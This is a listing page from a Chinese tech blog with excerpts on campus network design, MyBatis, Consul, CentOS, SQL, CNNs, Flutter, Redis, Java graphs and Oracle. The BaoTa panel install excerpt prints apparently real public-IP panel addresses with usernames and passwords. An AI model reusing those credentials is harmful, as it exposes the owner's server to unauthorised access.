易管理：扁平化的大二层网络，整体简化了网络结构，网络中大量的接入、汇聚作为逻辑二层设备只需要做简单的VLAN划分、端口隔离配置即可，不需要过多管理，核心设备作三层网关，启用路由、认证、安全相关功能，日常维护中，管理员只需要维护核心设备即可，大大降低了网络的运维难度，简化了工作量。
易部署：大二层网络，无论是有线用户还是无线用户，无论是采用802.1x认证还是portal认证，认证点统一集中在核心，部署方便快捷。同时，在大二层的环境中，大量的接入、汇聚设备配置基本类似，一些专注在教育行业的厂商也推出了快速配置工具用于批量设备上线时的快速配置下发，利用配置工具，操作过程简便，之前需要耗时几天的部署工作在2个小时内即可完成。
易维护：网络结构的简化将带来维护工作的简化，设备配置的简化必然会大幅度降低设备出问题的概率。从另一方面看，校园网的维护，需要在网络出现问题时能够快速定位，在网络管理层面上，需要把用户和端口对应起来，明确用户是从哪个端口接入上网，大二层架构中，可以轻松定位用户到具体的端口。
3.2 大二层网络设计特点 校园网络划分为多个逻辑区域，整体采用大二层结构设计，多个逻辑区域各司其职，用户全部在核心交换机上认证，汇聚、接入设备不需要维护复杂的网络协议，层次清晰，架构稳定，方便管理，易于扩展和维护。大二层组网具有以下特点：
(1)路由上收扁平化：核心设备作三层网关，终结ARP，启用路由协议，核心层设备功能丰富、性能强大、可以更好的满足校园网发展需求。接入、汇聚全部为纯二层配置，负责二层转发，维护工作简单，采购成本低廉。
(2)认证上收集中化：核心设备作为集中认证网管，终结认证，完成策略统一下发，接入层不需要启用认证，核心设备根据需要选择基于端口。
(3)有线无线一体化：有线无线统一认证，无线认证同样终结在核心，AC只需要管理AP，不需要同时做认证功能，解决了异构网络环境需要管理多套认证计费平台的问题。
(4)批量配置自动化：大二层架构，大量接入设备基本上配置相同，结合配置自动下发工具，在短时间内自动完成对接入设备的配置下发，大大减轻现场实施人员的工作量。
(5)用户定位精确化：与传统方案只能定位到接入交换机不同，大二层方案，可以直接定位用户到接入交换机的端口，满足的精确定位的需求。
四 大二层校园网的设计方案 4.1 网络总体设计 计算机网络系统以目前国际流行的TCP/IP为基础，采用OSI体系结构遵循国际标准，整个网络系统采用星型网络拓扑架构。
一般校园网网络楼宇内信息点比较集中，涉及众多的楼宇部门办公室。网络整体采用路由方式，汇聚终结广播，交换式的以太网络就不会应为网络设备对资源的争用而影响网络整体的效率和传输速度，从而大大提高整个网络的性能，降低网络发生阻塞的概率。
在本方案中，网络系统按系统结构以及功能规划为：局域网和广域网两个部分。
广域网主要由各种功能的路由器、出口设备、应用服务器、网络安全设备等组成。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/188d61fa92ec0355ceb5eccaa31dc8fc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b6340a73831b5e75391da7c9ff0d3a1b/" rel="bookmark">
			Mybatis常见面试题30道（附答案2023最新版）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、MyBatis是什么？MyBatis工作原理？MyBatis的使用场景有哪些？ MyBatis是一款优秀的持久层框架，它是一个基于Java语言的ORM框架，通过XML或注解的方式将Java对象和数据库中的表进行映射，实现持久化操作。
MyBatis是一款优秀的Java持久化框架，可以用于实现ORM（对象关系映射）和数据访问操作。
mybatis工作原理：
mybatis配置文件，包括Mybatis全局配置文件和Mybatis映射文件，其中全局配置文件配置了数据源、事务等信息；映射文件配置了SQL执行相关的信息。
mybatis通过读取配置文件信息(全局配置文件和映射文件)，构造出SqlSessionFactory，即会话工厂。
通过SqlSessionFactory，可以创建SqlSession即会话。
Mybatis是通过SqlSession来操作数据库的。SqlSession本身不能直接操作数据库，它是通过底层的Executor执行器接口来操作数据库的。
Executor接口有两个实现类，一个是普通执行器，一个是缓存执行器(默认)。Executor执行器要处理的SQL信息是封装到一个底层对象MappedStatement中。
MyBatis在以下场景下都有着广泛的应用：
1、数据库访问操作：MyBatis提供了灵活的SQL语句编写和自定义的SQL映射，可以更加细粒度地控制SQL语句的执行，因此适用于需要对数据库进行复杂操作的场景。
2、大数据量操作：MyBatis的批量操作和分页查询功能能够很好地处理大量数据的访问和操作，因此适用于需要对大量数据进行操作的场景。
3、高并发访问：MyBatis的缓存机制可以有效地减少数据库访问的次数，提高系统的并发能力，因此适用于需要支持高并发访问的场景。
4、数据库事务处理：MyBatis支持事务处理机制，可以对多个操作进行事务管理，因此适用于需要进行数据库事务处理的场景。
5、多数据源操作：MyBatis可以支持多数据源的操作，可以同时连接多个数据库进行操作，因此适用于需要同时操作多个数据库的场景。
综上所述，MyBatis可以广泛应用于各种需要进行数据库访问和ORM操作的场景，特别是在需要高并发、大数据量和复杂操作的场景下更加适用。
2、MyBatis具有哪些优点？ MyBatis具有以下优点：
1、灵活性高：MyBatis提供了丰富的映射语句和灵活的配置，可以满足不同的需求。
2、易于掌握：MyBatis的学习曲线比较平稳，上手比较容易。
3、性能较好：MyBatis通过对SQL语句和结果集的缓存，可以提高系统的性能。
4、可以自由控制SQL：MyBatis支持使用动态SQL来构建复杂的SQL语句，可以自由控制SQL的执行。
5、易于集成：MyBatis可以与Spring等框架进行集成，方便与其他框架一起使用。
总之，MyBatis是一款功能强大、易于使用、性能出色的ORM框架，被广泛应用于各种Java项目中。
3、MyBatis的工作原理是什么？ MyBatis的工作原理可以简单地概括为以下三个步骤：
1、通过SqlSessionFactoryBuilder创建SqlSessionFactory对象；
2、通过SqlSessionFactory对象的openSession方法创建SqlSession对象；
3、通过SqlSession对象操作数据库，包括执行SQL语句、提交事务等。
MyBatis的工作流程如下：
1、加载MyBatis的配置文件，包括数据库连接信息、映射文件的位置等；
2、解析配置文件，创建Configuration对象，用于保存MyBatis的配置信息；
3、创建SqlSessionFactory对象，SqlSessionFactory是一个线程安全的对象，是用于创建SqlSession对象的工厂；
4、创建SqlSession对象，SqlSession是MyBatis的核心对象，它是用于执行SQL语句的，一个SqlSession对象代表一次数据库连接；
5、通过SqlSession对象执行SQL语句，包括查询、插入、更新、删除等操作；
6、提交事务，如果需要的话；
7、关闭SqlSession对象，释放资源。
在整个工作流程中，MyBatis通过Configuration对象保存了各种配置信息，通过SqlSessionFactory对象创建SqlSession对象，通过SqlSession对象执行SQL语句，最终实现了与数据库的交互。
4、MyBatis的核心组件有哪些？ MyBatis的核心组件包括以下：
1、Configuration：MyBatis的配置类，用于保存MyBatis的配置信息，包括数据库连接信息、映射文件的位置、缓存配置等。
2、SqlSessionFactory：SqlSessionFactory是一个线程安全的对象，是用于创建SqlSession对象的工厂，它包括了Configuration对象和数据源等一些信息。
3、SqlSession：SqlSession是MyBatis的核心对象，它是用于执行SQL语句的，一个SqlSession对象代表一次数据库连接。SqlSession提供了一系列的方法，可以操作数据库，如查询操作、插入操作、更新操作、删除操作等。
4、Executor：Executor是MyBatis的执行器，负责执行SQL语句。
MyBatis提供了三种执行器：SimpleExecutor、ReuseExecutor和BatchExecutor，分别用于简单语句执行、重用预处理语句执行和批处理执行。
5、StatementHandler：StatementHandler是用于处理JDBC Statement的接口，MyBatis通过实现StatementHandler接口，封装了对JDBC Statement的操作。
6、ParameterHandler：ParameterHandler用于处理JDBC Statement的参数，MyBatis通过实现ParameterHandler接口，处理SQL语句中的参数。
7、ResultSetHandler：ResultSetHandler用于处理JDBC ResultSet的接口，MyBatis通过实现ResultSetHandler接口，封装了对JDBC ResultSet的操作。
8、TypeHandler：TypeHandler用于处理Java对象与JDBC类型之间的转换，MyBatis提供了丰富的TypeHandler来处理各种类型的转换。
5、MyBatis的动态SQL有哪些？如何使用动态SQL？ MyBatis的动态SQL包括以下几种：
If元素： 通过if元素可以实现条件判断，根据不同的条件生成不同的SQL语句。例如：
&lt;select id="findUserById" parameterType="int" resultType="User"&gt; select * from user where 1 = 1 &lt;if test="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b6340a73831b5e75391da7c9ff0d3a1b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/96e32fe369b955176ea369ac2af2b231/" rel="bookmark">
			Consule系列:Consul实现详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Consul 的实现 Consul 使用 Consensus 协议提供一致性(Consistency)—— CAP 定义的一致性。Consensus 协议是基于 “Raft: In search of an Understandable Consensus Algorithm” 实现的。
Consul Protocol Raft 算法
Raft 是基于 Paxos 的一致性算法。 与 Paxos 相比，Raft 被设计为具有更少的状态和更简单，更容易理解的算法。Raft 算法是一种基于日志复制实现数据同步的高效算法，它在解决分布式系统中各个节点记录内容一致性问题的同时，也使得集群具备一定的容错能力。这种容错能 力体现在两个方面。 当集群中出现网络故障或少于半数节点发生故障时，仍可以保证其余大多数节点正运行 。当集群中超过半数节点出现故障时 ，将导致集群不可用，但 Raft 算法依然可以保证节点中的数据不会出现错误的结果，从而为集群提供灾后备份和恢复的机会。 Raft 术语
Log:在 Raft 系统主要的工作单元为 Log entry。一致性的问题可以分解为复制日志。一个 log 是一个顺序的条目列表(entrylist)。如果所有成员都同意 log 的entry 和顺序，我们认为日志是一致的。FSM:有限状态机。FSM 是有限个状态的集合以及在这些状态之间的转移和动作等行为的数学模型。当应用新日志时，允许 FSM 在状态之间转换。 相同的日志序列的应用必须导致相同的状态，这意味着行为必须是确定性的。Peer set:Peer set 是参与日志复制的所有成员的集合。对于 Consul 而言，所有的 server 节点 均属于本地数据中心的 Peer set。Quorum:法定票数，取决于 Peer set 大多数成员。对于大小为 n 的 set，quorum 需要至少(n / 2)+1 个成员。例如，Peer set 有 5 个 server 节点，就需要 至少 3 个节点才能形成 quorum。无论什么原因，只要 quorum 是无效的，那么 cluster 就会变为 unavailable，并且不会再有 log 提交。Committed Entry:当条目永久存储在在法定数量的节点上，该条目才会被视为已提交(committed)。 一旦条目提交，它可以被应用。Leader:在任何给定的时间，Peer set 选举一个节点作为 Leader。当 log commited 时，Leader 负责新 entry 处理、复制到 Followers，以及管理何时 entry 被视为已提交。 Raft 角色和状态机
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/96e32fe369b955176ea369ac2af2b231/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c5a861ad59a4da4f53c0168fa343ff94/" rel="bookmark">
			Consul系列:什么是Consul?
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		引言 Consul 是 HashiCorp 公司推出的开源工具，用于实现分布式系统的服务发现与配置。与其他分布式服务注册与发现的方案， consu1 的方案更“一站式”，内置了服务注册 与发现框架、分布一致性协议实现、健康检查、Key/Value 存储、多数据中心方案，不再需要依赖其他工具(比如 ZooKeeper 等。使用起来也较为简单。Consul 用 Golang 实现，因此具有天然可移植性(支持 Linux、windows 和 Mac Os X);安装包仅包含一个可执行文件，方便部署，与 Docker 等轻量级容器可无缝配合。其一致 性协议采用 Raft 算法，用来保证服务的高可用。使用 GOSSIP 协议管理成员和广播消息，并且支持ACL 访问控制。
值得一提的是，命令行超级好用的虚拟机管理软件 grant 也是 HashiCorp 公司开发的产品
Consul 的使用场景 服务通信地址域名化，动态迁移服务SaaS 应用的服务发现与配置共享与 consul-template 服务集成，动态生成 nginx 和 haproxy 配置文件 Consul 的优势 使用 Raft 算法来保证一致性,比复杂的 Paxos 算法更直接支持多数据中心，内外网的服务采用不同的端口进行监听。 多数据中心集群可以避免单数据中心的单点故障而其部署则需要考虑网络延迟,分片等情况等。 zookeeper 和 etcd 均不提供多数据中心功能的支持支持健康检查，Etcd 不提供此功能支持 HTTP 和 DNS 协议接口，Zookeeper 的集成较为复杂，Etcd 只支持 HTTP 协议官方提供 Web 管理界面,Etcd 无此功能 相关术语 agent**:运行在 consul集群所有节点上的核心服务，其可运行在 client 或 server 模式，通过consul agent 命令来启动。由于所有节点必须运行 agent，指定节 点运行于 client 或者server 模式是很简单地，除非有其它的 agent 实例。所有的 agent 都能运行 DNS 或者HTTP 接口，并负责运行时检查和保持服务同步。client:一个 client 是一个转发所有 RPC到 server 的 agent 。这个 client 是相对无状态的。client 唯一执行的后台活动是加入 LAN gossip 池。这有一个最低的 资源开销并且仅消耗少量的网络带宽。server:一个 server 是一个有一组扩展功能的 agent，这些功能包括 参与 Raft 选举，维护集群状态，响应 RPC 查询，与其他数据中心交互 WAN gossip 和转发 查询给 leader 或者远程数据中心。每个数据中心至少有一个 agent 运行在 server 模式，推荐为 3 个或 5个DataCenter:虽然数据中心的定义是显而易见的，但是有一些细微的细节必须考虑。例如，在EC2 中，多个可用区域被认为组成一个数据中心?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c5a861ad59a4da4f53c0168fa343ff94/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f8ce3dbcb159e5a0f4c3b50703a65f0a/" rel="bookmark">
			centos下载镜像文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.进入centos官网
Download (centos.org)https://www.centos.org/download/
2.根据系统选择合适的版本
如果电脑是win10系统的话就选择x86版本，点击进入如图界面
3.点击任意一个镜像源，选择以iso结尾的文件下载
2.分区和挂载点 挂载点就是指定的目录
例如把硬盘上分区1挂载到/usr目录上，那么usr目录就是一个挂载点，/usr目录下的文件和目录在物理意义上位于分区1，但是/usr目录下的其他目录也有可能是其他分区的挂载点。
实例：如果分区 /dev/hda5 被 挂载在 /usr 上，这意味着所有在 /usr 之下的文件和目录在物理意义上位于 /dev/hda5 上。因此文件 /usr/share/doc/FAQ/txt/Linux-FAQ 被储存在 /dev/hda5上，而文件 /etc/X11/gdm/Sessions/Gnome 却不是。
继续以上的例子，/usr 之下的一个或多个目录还有可能是其它分区的挂载点。例如，某个分区(假设为，/dev/hda7)可以被挂载到 /usr/local 下，这意味着 /usr/local/man/whatis 将位于 /dev/hda7 上而不是 /dev/hda5 上。
linux下的挂载点和分区是什么关系（详解挂载点）_水无垠ZZU的博客-CSDN博客https://blog.csdn.net/low5252/article/details/102825584
结论：linux的目录结构主要是逻辑上的组织关系，物理硬盘上根据分区和挂载点判断出目录和存储的映射关系。
3.目录功能 ①. /bin ：存放常用命令（即二进制可执行程序）
②. /etc ：存放系统配置文件
③. /home ：所有普通用户的家目录
④. /root ：管理员用户的家目录
⑤. /usr ：存放系统应用程序及文档
⑥. /proc ：虚拟文件系统目录，以进程为单位存储内存的映射
⑦. /dev ：存放设备文件
⑧. /mnt ：临时挂载点
⑨. /lib ：存放库文件
⑩. /boot ：系统内核及启动有关的文件
⑪. /tmp ：存放各种临时文件，是所有用户均可访问的地点
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f8ce3dbcb159e5a0f4c3b50703a65f0a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c2747cb3448a6da365c724f94749a38e/" rel="bookmark">
			SQLBoy之LC刷题函数篇
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		SQLBoy之LC刷题函数篇 时间篇 1.时间差值函数 datediff (date1,date2): res = days of from date1 to date2 if date1 &gt; date2 IS positive number else IS negative number Attention : return Interger Not Boolean e.g. : datediff("2023-05-02","2023-05-01") # 1 2.日期 +N / -N函数 addDate(date,INTERVAL expr unit) #expr （time interval）：time to add positive number + / negative number - #unit : day、minute、hour、second default：day detail from https://blog.csdn.net/weixin_46082526/article/details/108044313 3.计算相差日期 timeStampDiff（unit，date1，date2）Calculate the difference based on units e.g. ：TIMESTAMPDIFF(HOUR, '2023-03-22 07:00:00', '2023-03-22 18:00:00'); # 11 String篇 1、Contact函数的使用 contact(str1,str2,.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c2747cb3448a6da365c724f94749a38e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6823f3568f5773b305baa6811cfe288f/" rel="bookmark">
			MATLAB-深度网络设计器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一、操作步骤
1、打开APP中的深度网络设计器
2、点击建立空白网络
3、根据图像数据的具体情况建立神经网络，本文以2为图像数据为例
4、调整分类数，本文演示2分类
5、导入数据
本文演示的数据为“123”文件夹下A/B两类图片数据
6、训练模型
二、卷积神经网络原理
（一）计算机视觉原理
计算机视觉原理：
以下图为例，不同于人眼可以直接观察到图像形态和色彩特征，计算机是依靠数值矩阵记录图像的。首先将图片分割为N*N个分布，N的大小反应计算机的最小分辨率。每一个经过分割的小单元称为一个像素点。这里举一个不恰当的例子，为了便于理解和展示这里以3*3为例。将图片分为9个像素点。（实际为320*480个像素点，但是为了方便方便说明，后文均假设为9个像素点）
每个像素点包含的信息是色彩组成。是由电脑显示器产生的不可分解的三色光：红、绿、蓝。其信息为红、绿、蓝三色量化明暗程度的数值组成的三维矩阵。也是神经网络的输入信息。
（二）基础神经网络
神经网络是一种多层前馈神经网络，该网络的主要特点是信号前向传递，误差反向传播。在前向传递中，输人信号从输入层经隐含层逐层处理，直至输出层。每一层的神经元状态只影响下一-层神经元状态。如果输出层得不到期望输出，则转入反向传播，根据预测误差调整网络权值和阈值，从而使 BP神经网络预测输出不断逼近期望输出。
神经网络的拓扑结构如图所示。
1、前向传递
（1）线性函数
f：模型属于各个分类结果的得分
x：输入信息
w：权重参数
b：偏置参数
X1-x9分别代表9个像素点的三维矩阵，f1-f4为模型判断该图片在四种分类结果上的评分。
wij代表针对第i个分类结果，第j个像素点的贡献程度。
（2）损失函数
L：反应模型的错误程度，是神经网络寻找最优权重参数的线索。
Si：正确分类得分
SJ：错误分类得分
R：正则化惩罚项
针对输入为物品1的情况：损失函数L为f1,1，与其余三项的差之和与0取最大值。
公式中的“+1”是为了避免错误分类得分略小于正确分类得分是取到0。因为0代表没有损失与实际情况不符，因此在公式后加一。1便相当于模型的容忍度。
（3）Softmax分类器
Softmax分类器的作用是将线性函数求出的得分转化为概率，使模型效果更加直观。
P：模型判断正确的概率
X：第i个物品各个判断结果的得分
可以将Softmax分类器的步骤概括为得分在e^x的映射，再进行归一化处理，计算正确判断的占比。
其中得分做e^x的映射可以放大得分差异，使结果的差距更加明显。
损失函数L=-logP，因此满足当P趋于1，时，L趋于0。表示模型的准确度较高；P趋于0，时，L趋于正无穷。表示模型的准确度较低；L=-logP图像如下
2、反向传递
反向传递是在已知误差函数且输入数据不变的条件下，缩短实际值与理想值的方法便是调整各个感知机的参数。因此以反向传输为策略，利用梯度下降的方法调整参数值。
梯度下降的本质是将总体误差分配到各个参数上，让所有的感知机共同承担降低模型误差的任务。
梯度的含义为曲面上变化最快的方向，示意图如下
反向传递具体流程简化示意
将评分误差反向分散到参数
当n-1=0时，fn-1为原始输入数据
调整的参数为为原参数减去学习率与梯度的乘积。
（三）卷积神经网络
整体构架
1、卷积作用
卷积层的作⽤是提取输⼊图⽚中的信息，这些信息被称为图像特征，这些特征是由图像中的每个像素通过组合或者独⽴的⽅式所体现。
这⾥的卷积操作是通过卷积核对每个通道的矩阵从左到右从上⾄下进⾏互相关运算，滑动的步长是个超参数，互相关运算的意思就是对应位置相乘再相加，最后把三个通道的值也对应加起来得到⼀个值。
2、激活层
激活层作用是将上层的输出特征信息进行非线 性激活输出。因为卷积神经网络的层次往往比较深引起梯度消减的问题，在这些非线性激活函数中，线性修正单元函数能够很好地解决网络的梯度弥散问题，缩减训练时间，加快收敛速度。
常见的激活函数有如下几种
3、池化作用
池化层的作⽤是对卷积层中提取的特征进⾏挑选。
常见的池化操作有最⼤池化和平均池化，池化层是由n×n⼤⼩的矩阵窗⼝滑动来进⾏计算n×n⼤⼩的矩阵中的最⼤值和平均值。
4、全连接层
池化层的后⾯⼀般接着全连接层，全连接层将池化层的所有特征矩阵转化成⼀维的特征⼤向量，全连接层放在卷积神经⽹络结构中的最后，即准备输出结果。
全连接层的主要是将前面提取的二维特征向量转化成一维特征向量，并由分类器完成分类。计算公式如下：
5、训练的优化算法
卷积网络通过前向传播和反向传播算法来训练网络的所有参数，利用梯度下降算法解决学习率的选择问题。
梯度下降的本质是将总体误差分配到各个参数上，让所有的感知机共同承担降低模型误差的任务。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8084788722dae3b5805d6a846fb0d799/" rel="bookmark">
			Cannot run with sound null safety, because the following dependencies don‘t support null safety
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		flutter运行报错如下： 报错原因 出现上面报错是因为以下这些包（flutter_swiper、flutter_page_indicator、transformer_page_view）不支持safety模式。
解决方法： 1、直接在AS 的 Terminal窗口输出命令行进行打包(此种方法，每次打包都需要使用命令行打包，有些童鞋可能不太习惯。如果想使用AS的三角形按钮打包，请选择方法2。)：
flutter run --no-sound-null-safety 2、Android Studio工具，选择【Run】 --&gt;【 Edit Configurations】 --&gt; 【Add Additional Run args 】–&gt; 【–no-sound-null-safety】，如下图：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a94ad1b77d0830ddf41bfe7f9eea0283/" rel="bookmark">
			【linux服务器基础环境配置3】-宝塔管理面板安装部署
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【服务器环境部署篇】-宝塔管理面板 1.了解一下什么是服务器管理面版 简单的说：
让用户通过可视化页面来管理服务器（环境安装，数据库管理，文件管理等等）
服务器管理面板是一种软件，它可以帮助用户通过图形化界面管理服务器，而不需要使用命令行界面。服务器管理面板可以帮助用户轻松地进行各种操作，如网站管理、数据库管理、FTP管理、SSL证书管理等。通过服务器管理面板，用户可以更加方便地进行服务器设置和管理，而不需要具备专业的技术知识。同时，服务器管理面板还提供了一些自动化的功能，如备份、监控、安全性检查等，可以帮助用户更好地保障服务器的稳定性和安全性。常见的服务器管理面板有wdcp、Plesk、宝塔等。
2.宝塔是什么？ 宝塔是一款免费的服务器管理面板软件，可以帮助用户轻松管理服务器的各种操作，如网站管理、数据库管理、FTP管理、SSL证书管理、备份等。宝塔可以自动化完成一些繁琐的操作，使服务器管理变得更加简单和高效。宝塔还提供了丰富的插件和扩展，可以满足不同用户的需求。宝塔适用于Linux服务器管理，支持多种Linux操作系统和Web服务器软件。
3.宝塔的官网地址 https://www.bt.cn/new/index.html
4.为什么要使用宝塔 快速简单方便直观 5.安装宝塔 点击【立即免费安装】
复制安装命令
在centos的服务器上运行即可，中间输入2次y
一键安装，方便快捷
安装好了后，会看到如下提示：
例如：
我的地址就是：
https://121.37.176.5:39488/b2b8f890
username: gez04cge
password: 263db1d0
外网面板地址: https://121.36.245.186:31059/395869bc
内网面板地址: https://192.168.0.17:31059/395869bc
username: mucchc7e
password: a06950f8
特别注意，如果是云服务器，记得去开放安全组的端口，否则不能访问
这样就进来了
6.使用宝塔 1.登录
2.进入首页，选择一套基础环境进行安装
3.选择LNMP
在左上角可以随时查看安装进度
4.等待安装完成
5.可以在软件商店里下载其他服务器所需要的环境配置
6.可以在文件管理里面管理服务器上的文件
7.可以在监控里面查看到资源占用率
8.可以在数据库里面看数据库的情况
可以添加数据库
9.可以在安全里面开放端口
这里开放跟使用firewall命令开放是一样的
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b7dbc22eb4d950c9c9e88069e1df4bfe/" rel="bookmark">
			redis源码解析- sds实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		redis在底层使用sds来实现字符数组，我们看下其实怎么实现的。
在redis中，使用sds结构体来表示代替字符数组：
/* Note: sdshdr5 is never used, we just access the flags byte directly. * However is here to document the layout of type 5 SDS strings. */ struct __attribute__ ((__packed__)) sdshdr5 { unsigned char flags; /* 3 lsb of type, and 5 msb of string length */ char buf[]; }; struct __attribute__ ((__packed__)) sdshdr8 { uint8_t len; /* used */ uint8_t alloc; /* excluding the header and null terminator */ unsigned char flags; /* 3 lsb of type, 5 unused bits */ char buf[]; }; struct __attribute__ ((__packed__)) sdshdr16 { uint16_t len; /* used */ uint16_t alloc; /* excluding the header and null terminator */ unsigned char flags; /* 3 lsb of type, 5 unused bits */ char buf[]; }; struct __attribute__ ((__packed__)) sdshdr32 { uint32_t len; /* used */ uint32_t alloc; /* excluding the header and null terminator */ unsigned char flags; /* 3 lsb of type, 5 unused bits */ char buf[]; }; struct __attribute__ ((__packed__)) sdshdr64 { uint64_t len; /* used */ uint64_t alloc; /* excluding the header and null terminator */ unsigned char flags; /* 3 lsb of type, 5 unused bits */ char buf[]; }; 这其中，目前sdshdr5已经不在使用，而是用sdshdr8代替sdshdr5 struct __attribute__ 主要是告诉编译器不用内存对齐，而是按照实际占用内存字节数，从这里也看出，redis在底层很多地方进行了资源的节约。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b7dbc22eb4d950c9c9e88069e1df4bfe/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9bb019f60e343133527dc6a41518101f/" rel="bookmark">
			Java 与数据结构（6）：图
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、图 图是一种非常重要的数据结构，在计算机科学和网络科学中被广泛应用。图由节点（顶点）和边组成，节点表示实体，边表示实体之间的关系。图可以用来描述各种复杂的关系，如社交网络、路线图、组织结构等。
在计算机科学中，图被广泛应用于图算法、网络分析、图形数据库等领域。在网络科学中，图被用于描述社交网络、互联网拓扑结构、蛋白质相互作用网络等。
图可以分为有向图和无向图两种类型。有向图中的边有方向，表示从一个节点到另一个节点的单向关系。无向图中的边没有方向，表示两个节点之间的双向关系。
图的基本概念包括节点、边、路径、连通性、度数等。节点的度数表示与该节点相连的边的数量，路径是由若干个节点和边组成的序列，连通性表示图中的节点是否能够互相到达。
图的存储方式包括邻接矩阵和邻接表两种方式。邻接矩阵使用二维数组来表示图的节点和边，适用于稠密图。邻接表使用链表来表示图的节点和边，适用于稀疏图。
在算法设计中，图算法是一种重要的算法类型，包括最短路径算法、最小生成树算法、拓扑排序算法、图着色算法等。这些算法可以用来解决各种实际问题，如路线规划、资源分配、任务调度等。
二、Java 示例 以下是一个使用Java语言实现图的示例：
import java.util.ArrayList; import java.util.LinkedList; import java.util.Queue; public class Graph { private int V; // 图中节点的数量 private ArrayList&lt;Integer&gt;[] adj; // 存储图中节点的邻接表 public Graph(int v) { V = v; adj = new ArrayList[V]; for (int i = 0; i &lt; V; i++) { adj[i] = new ArrayList&lt;Integer&gt;(); } } public void addEdge(int u, int v) { adj[u].add(v); adj[v].add(u); } public void bfs(int s) { boolean[] visited = new boolean[V]; Queue&lt;Integer&gt; q = new LinkedList&lt;Integer&gt;(); visited[s] = true; q.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9bb019f60e343133527dc6a41518101f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4ea82d83cf64096a6fe337471916a354/" rel="bookmark">
			oracle一条记录拆分成多条
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 使用TABLE()函数和SPLIT()函数来进行拆分，此函数默认用逗号拆分
SELECT * FROM TABLE(SPLIT('1,2,3,4'));
查询结果为：
也可以自定义分隔符号进行拆分，比如使用#号进行拆分
SELECT * FROM TABLE(SPLIT('a#b#c#d', '#'));
查询结果为：
使用场景：
如上图所示，现需要将RANGE字段的值用逗号拆分成多条记录，就可以使用这个函数。
查询语句：
SELECT T1.ID,T1.RANGE,T2.COLUMN_VALUE AS DS_ID
FROM AS_SMS_REMIND_ITEM T1,TABLE(SPLIT(T1.RANGE)) T2
WHERE T1.ID=1733; 执行结果为： split函数定义：
create or replace function split (p_list clob, p_sep varchar2 := ',') return tabletype pipelined is l_idx pls_integer; v_list varchar2 (32676) := to_char(p_list); begin loop l_idx := instr (v_list, p_sep); if l_idx &gt; 0 then pipe row (substr (v_list, 1, l_idx - 1)); v_list := substr (v_list, l_idx + length (p_sep)); else pipe row (v_list); exit; end if; end loop; end; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e8cc19f9969e5f28f9159493ddc204a2/" rel="bookmark">
			动态配置PLL：IOPLL Reconfig
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		PLL（锁相环）是FPGA中常见的 IP CORE ，使用之初认为IP核进行配置后无法进行重配置，但在了解了 IOPLL Reconofig IP CORE 过后了解到原来 PLL IP CORE 也是能够进行动态重配置的
在了解 IOPLL Reconfig IP CORE 之前首先要了解 PLL 的工作原理
上图分别是 fPLL （小数分频）和 IOPLL（整数分频） 的内部结构图，M、N、C，分别代表的是 乘法单元、前分频器、输出分频，个人理解为 OUT_CLK[x] = IN_CLK * M / N / Cx；
描述完PLL的一个内部结构，下面就介绍一下 IOPLL Reconofig IP CORE 的使用
首先，需要调用 IOPLL IP CORE ，具体调用不做过多介绍，主要需要注意的地方如下：
两种使能分别为 使能锁相环动态重配置 、允许访问动态移相端口 ，具体区别在哪里下文会进行介绍
调用完 IOPLL IP CORE 后继续调用 IOPLL Reconofig IP CORE ，并以如下这种方式进行连接
接下来是对 PLL 重配置的详细介绍：
首先有两种动态配置方法：
1.通过初始化mif文件进行流式重配置
2.重新配置PLL设置：M、N、C重配置
配置具体操作如下：
1.写地址和数据，发送重配置命令
	</div>
	<div class="list__footer clearfix">
